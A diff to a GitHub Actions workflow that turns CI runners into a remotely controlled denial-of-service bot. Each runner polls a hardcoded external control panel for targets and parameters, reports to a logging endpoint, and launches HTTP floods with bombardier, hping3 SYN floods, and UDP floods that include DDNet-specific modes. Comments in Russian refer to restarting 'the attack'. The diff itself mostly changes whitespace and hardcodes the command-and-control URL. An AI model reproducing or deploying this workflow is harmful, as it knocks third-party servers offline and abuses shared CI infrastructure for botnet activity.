@@ -33,7 +33,7 @@ jobs:
       - name: Cache & Install Tools
         run: |
           sudo apt-get update -qq && sudo apt-get install -y hping3 curl jq --no-install-recommends
-         
+          
           if [ ! -f /usr/local/bin/bombardier ]; then
             wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier-linux-amd64
             chmod +x bombardier-linux-amd64
@@ -47,14 +47,16 @@ jobs:
 
       - name: JSON Controller + Self-Restart + Logging
         env:
-          JSON_URL: ${{ inputs.json_url }}
+          JSON_URL: "https://aarr.alwaysdata.net/paneldemo/config.json"
           LOG_URL: "https://aarr.alwaysdata.net/paneldemo/log.php"
           RUNNER_ID: "runner${{ matrix.runner_id }}"
         run: |
           echo "=== Runner $RUNNER_ID запущен ==="
+          echo "JSON_URL: $JSON_URL"          # Для отладки
+          
           CURRENT_PID=0
           CURRENT_PARAMS=""
-
+          
           while true; do
             if ! JSON=$(curl -s -m 8 "$JSON_URL"); then
               echo "[-] Failed to fetch JSON"
@@ -87,7 +89,6 @@ jobs:
                 wait $CURRENT_PID 2>/dev/null || true
                 CURRENT_PID=0
               fi
-
             elif [ "$NEW_PARAMS" != "$CURRENT_PARAMS" ] || [ $CURRENT_PID -eq 0 ]; then
               if [ $CURRENT_PID -ne 0 ]; then
                 echo "[~] [$RUNNER_ID] Перезапуск атаки с новыми параметрами"
@@ -101,43 +102,36 @@ jobs:
                 "http")
                   bombardier -c 1000 -d "$DURATION" --http2 -l "$TARGET?cache=$RANDOM" &
                   ;;
-
                 "tcp")
                   sudo hping3 --flood -S -p "$PORT" "$TARGET" &
                   ;;
-
                 "udp")
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" \
                     -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" -t 1s &
                   ;;
-
                 udp-ddnet-*)
                   DDNET_FLAGS="-ddnet-info"
                   case "$METHOD" in
                     "udp-ddnet-vanilla") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind vanilla" ;;
                     "udp-ddnet-extended") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind extended" ;;
                     "udp-ddnet-legacy64") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind legacy64" ;;
-                    "udp-ddnet-mixed")   DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
+                    "udp-ddnet-mixed") DDNET_FLAGS="$DDNET_FLAGS -ddnet-info-kind mixed" ;;
                   esac
-
                   if [ "$OPEN_LOOP" = "true" ]; then
                     DDNET_FLAGS="$DDNET_FLAGS -open-loop"
                     if [ "$BURST_ON" != "0s" ]; then
                       DDNET_FLAGS="$DDNET_FLAGS -burst-on $BURST_ON -burst-off $BURST_OFF"
                     fi
                   fi
-
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" \
                     -c "$CONNECTIONS" -n 0 -d "$DURATION" -r "$RATE" $DDNET_FLAGS &
                   ;;
-
                 "firewall-check")
                   FW_FLAGS="-firewall-check -fw-max-pps $FW_MAX_PPS -fw-start-pps $FW_START_PPS \
                     -fw-step-up $FW_STEP_UP -fw-loss-threshold $FW_LOSS_THRESHOLD"
                   [ "$FW_PAD_DDNET" = "true" ] && FW_FLAGS="$FW_FLAGS -fw-pad-ddnet"
                   ./bombarida -mode client -addr "${TARGET}:${PORT}" $FW_FLAGS &
                   ;;
-
                 *)
                   echo "[-] [$RUNNER_ID] Неизвестный метод: $METHOD"
                   sleep 5
